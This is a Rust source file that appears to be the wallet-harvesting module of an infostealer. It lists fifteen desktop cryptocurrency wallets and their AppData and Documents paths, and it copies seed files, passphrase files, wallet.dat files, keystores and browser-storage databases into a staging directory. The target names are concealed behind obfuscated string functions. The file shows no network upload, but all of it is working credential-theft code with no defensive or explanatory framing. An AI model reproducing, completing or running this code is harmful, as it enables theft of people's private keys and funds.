use std::path::PathBuf;
use crate::encrypted::*;

struct DesktopWallet {
    name: String,
    app_paths: Vec<PathBuf>,
    target_files: Vec<String>,
    target_directories: Vec<String>,
}

fn get_desktop_wallets() -> Vec<DesktopWallet> {
    let mut wallets = Vec::new();
    
    if let Ok(appdata_roaming) = std::env::var(s_appdata()) {
        let roaming = PathBuf::from(appdata_roaming);
        
        wallets.push(DesktopWallet {
            name: s_dapp_exodus(),
            app_paths: vec![roaming.join(s_dapp_exodus())],
            target_files: vec![s_dapp_exodus_wallet(), s_dapp_seed_seco(), s_dapp_passphrase_json(), format!("*{}", s_wpat_seco()), format!("*{}", s_wpat_json())],
            target_directories: vec![s_dapp_exodus_wallet()],
        });
        
        wallets.push(DesktopWallet {
            name: s_dapp_electrum(),
            app_paths: vec![roaming.join(s_dapp_electrum()).join(s_dapp_electrum_wallets())],
            target_files: vec![s_dapp_default_wallet(), format!("*{}", s_wpat_dat()), s_dapp_recent_servers(), s_dapp_recent_servers()],
            target_directories: vec![],
        });
        
        wallets.push(DesktopWallet {
            name: s_dapp_atomic(),
            app_paths: vec![roaming.join(s_dapp_atomic_dir())],
            target_files: vec![format!("*{}", s_wpat_db()), format!("*{}", s_wpat_log())],
            target_directories: vec![s_wpath_local_storage(), s_wpath_indexeddb(), s_dapp_databases()],
        });
        
        wallets.push(DesktopWallet {
            name: s_dapp_jaxx(),
            app_paths: vec![roaming.join(s_dapp_jaxx_dir())],
            target_files: vec![format!("*{}", s_wpat_leveldb()), format!("*{}", s_wpat_log()), s_wpat_current(), s_wpat_manifest()],
            target_directories: vec![s_wpath_indexeddb()],
        });
        
        wallets.push(DesktopWallet {
            name: s_dapp_zcash(),
            app_paths: vec![roaming.join(s_dapp_zcash_dir())],
            target_files: vec![s_dapp_wallet_dat(), s_dapp_zcash_conf()],
            target_directories: vec![],
        });
        
        wallets.push(DesktopWallet {
            name: s_dapp_guarda(),
            app_paths: vec![roaming.join(s_dapp_guarda_dir())],
            target_files: vec![format!("*{}", s_wpat_db()), format!("*{}", s_wpat_log())],
            target_directories: vec![s_wpath_local_storage(), s_wpath_indexeddb()],
        });
        
        wallets.push(DesktopWallet {
            name: s_dapp_coinomi(),
            app_paths: vec![roaming.join(s_dapp_coinomi_dir()).join(s_dapp_coinomi()).join(s_dapp_coinomi_wallets())],
            target_files: vec![format!("*{}", s_wpat_wallet()), format!("*{}", s_wpat_aes()), s_dapp_coinomi_config()],
            target_directories: vec![],
        });
    }
    
    if let Ok(appdata_local) = std::env::var(s_localappdata()) {
        let local = PathBuf::from(appdata_local);
        
        wallets.push(DesktopWallet {
            name: s_dapp_binance(),
            app_paths: vec![local.join(s_dapp_binance_dir())],
            target_files: vec![format!("*{}", s_wpat_db()), format!("*{}", s_wpat_log())],
            target_directories: vec![s_wpath_local_storage(), s_wpath_indexeddb()],
        });
        
        wallets.push(DesktopWallet {
            name: s_dapp_tokenpocket(),
            app_paths: vec![local.join(s_dapp_tokenpocket_dir())],
            target_files: vec![format!("*{}", s_wpat_db()), format!("*{}", s_wpat_log())],
            target_directories: vec![s_wpath_local_storage(), s_wpath_indexeddb()],
        });
    }
    
    if let Ok(userprofile) = std::env::var(s_dapp_userprofile()) {
        let user = PathBuf::from(userprofile);
        let appdata = user.join(s_dapp_appdata_roaming()).join(s_dapp_roaming());
        
        wallets.push(DesktopWallet {
            name: s_dapp_bitcoin(),
            app_paths: vec![appdata.join(s_dapp_bitcoin_dir())],
            target_files: vec![s_dapp_wallet_dat(), s_dapp_bitcoin_conf(), format!("*{}", s_wpat_log())],
            target_directories: vec![s_dapp_electrum_wallets()],
        });
        
        wallets.push(DesktopWallet {
            name: s_dapp_litecoin(),
            app_paths: vec![appdata.join(s_dapp_litecoin_dir())],
            target_files: vec![s_dapp_wallet_dat(), s_dapp_litecoin_conf(), format!("*{}", s_wpat_log())],
            target_directories: vec![],
        });
        
        wallets.push(DesktopWallet {
            name: s_dapp_dogecoin(),
            app_paths: vec![appdata.join(s_dapp_dogecoin_dir())],
            target_files: vec![s_dapp_wallet_dat(), s_dapp_dogecoin_conf(), format!("*{}", s_wpat_log())],
            target_directories: vec![],
        });
        
        wallets.push(DesktopWallet {
            name: s_dapp_dash(),
            app_paths: vec![appdata.join(s_dapp_dash_dir())],
            target_files: vec![s_dapp_wallet_dat(), s_dapp_dash_conf(), format!("*{}", s_wpat_log())],
            target_directories: vec![],
        });
        
        wallets.push(DesktopWallet {
            name: s_dapp_ethereum(),
            app_paths: vec![appdata.join(s_dapp_ethereum_dir())],
            target_files: vec![format!("*{}", s_wpat_json()), format!("*{}", s_wpat_ipc()), format!("*{}", s_wpat_log())],
            target_directories: vec![s_dapp_keystore()],
        });
        
        let docs = user.join(s_dapp_documents());
        wallets.push(DesktopWallet {
            name: s_dapp_monero(),
            app_paths: vec![docs.join(s_dapp_monero_dir())],
            target_files: vec![format!("*{}", s_wpat_keys()), format!("*{}", s_wpat_txt()), s_dapp_monero_config()],
            target_directories: vec![s_dapp_electrum_wallets()],
        });
    }
    
    wallets
}

fn matches_pattern(filename: &str, pattern: &str) -> bool {
    if pattern.starts_with('*') && pattern.ends_with('*') {
        let inner = &pattern[1..pattern.len() - 1];
        filename.contains(inner)
    } else if pattern.starts_with('*') {
        filename.ends_with(&pattern[1..])
    } else if pattern.ends_with('*') {
        filename.starts_with(&pattern[..pattern.len() - 1])
    } else {
        filename == pattern
    }
}

fn copy_wallet_file(source_path: &PathBuf, dest_dir: &PathBuf, file_pattern: &str) {
    if !source_path.exists() {
        return;
    }
    
    let _ = std::fs::create_dir_all(dest_dir);
    
    if source_path.is_file() {
        if let Some(name) = source_path.file_name() {
            let file_name = name.to_string_lossy();
            if matches_pattern(&file_name, file_pattern) {
                let dest_file = dest_dir.join(&*file_name);
                let _ = std::fs::copy(source_path, dest_file);
            }
        }
        return;
    }
    
    if let Ok(entries) = std::fs::read_dir(source_path) {
        for entry in entries.flatten() {
            let file_name = entry.file_name().to_string_lossy().to_string();
            let file_path = entry.path();
            
            if file_path.is_file() && matches_pattern(&file_name, file_pattern) {
                let dest_file = dest_dir.join(&file_name);
                let _ = std::fs::copy(&file_path, &dest_file);
            } else if file_path.is_dir() {
                copy_wallet_file(&file_path, dest_dir, file_pattern);
            }
        }
    }
}

fn copy_wallet_directory(source_dir: &PathBuf, dest_dir: &PathBuf) {
    if !source_dir.exists() {
        return;
    }
    
    let _ = std::fs::create_dir_all(dest_dir);
    
    if let Ok(entries) = std::fs::read_dir(source_dir) {
        for entry in entries.flatten() {
            let source_path = entry.path();
            let dest_path = dest_dir.join(entry.file_name());
            
            if source_path.is_dir() {
                copy_wallet_directory(&source_path, &dest_path);
            } else {
                let _ = std::fs::copy(&source_path, &dest_path);
            }
        }
    }
}

pub fn extract_desktop_wallets() {
    let wallets = get_desktop_wallets();
    let output_dir = super::get_wallet_output_dir();
    
    for wallet in &wallets {
        for app_path in &wallet.app_paths {
            if !app_path.exists() {
                continue;
            }
            
            let dest_base = output_dir.join(&wallet.name);
            
            for file_pattern in &wallet.target_files {
                copy_wallet_file(app_path, &dest_base.join("files"), file_pattern);
            }
            
            for dir_name in &wallet.target_directories {
                let source_sub = app_path.join(dir_name);
                let dest_sub = dest_base.join(dir_name);
                copy_wallet_directory(&source_sub, &dest_sub);
            }
        }
    }
}
